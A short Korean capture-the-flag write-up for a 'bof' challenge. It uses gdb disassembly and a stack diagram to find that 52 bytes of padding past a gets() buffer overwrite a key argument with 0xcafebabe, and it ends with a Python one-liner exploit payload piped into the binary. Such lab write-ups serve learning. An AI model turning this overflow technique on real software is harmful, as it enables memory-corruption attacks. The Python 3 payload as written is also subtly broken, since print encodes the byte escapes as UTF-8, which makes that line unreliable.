## 풀이

1. func()에서 key = 0xdeadbeef를 key = 0xcafebabe로 바꾸면 플래그를 출력한다.
2. gets() 함수를 이용해 입력을 받고 target[32] 32바이트를 넘겨서 key를 덮어 쓸 수 있다.
3. key[4]와 target[32] 간의 거리를 gdb로 분석하면 다음과 같다.
```
(gdb) disas func
Dump of assembler code for function func:
   0x0000062c <+0>:	push   ebp
   0x0000062d <+1>:	mov    ebp,esp
   0x0000062f <+3>:  	sub    esp,0x48
   0x00000632 <+6>:	mov    eax,gs:0x14
   0x00000638 <+12>:	mov    DWORD PTR [ebp-0xc],eax
   0x0000063b <+15>:	xor    eax,eax
   0x0000063d <+17>:	mov    DWORD PTR [esp],0x78c
   0x00000644 <+24>:	call   0x645 <func+25>
   0x00000649 <+29>:	lea    eax,[ebp-0x2c]
   0x0000064c <+32>:	mov    DWORD PTR [esp],eax
   0x0000064f <+35>:	call   0x650 <func+36>
   0x00000654 <+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x0000065b <+47>:	jne    0x66b <func+63
   .
   .

따라서 Key는 ebp+0x8에 위치
target[32]는 ebp-0x2c에 위치
```
4. 이를 스택으로 표현면 다음과 같다.
```
== Low Address ==

target[32]

dummy[12]

ebp+ret[8]

key[4]

== High Address ==
```
5. 따라서 52바이트의 패딩를 이용해 key를 덮어 쓸 수 있다.
6. 이를 이용해 플래그를 얻을 수 있다.
```
python3 -c 'print("A"*52 + "\xbe\xba\xfe\xca")' | ./bof
```
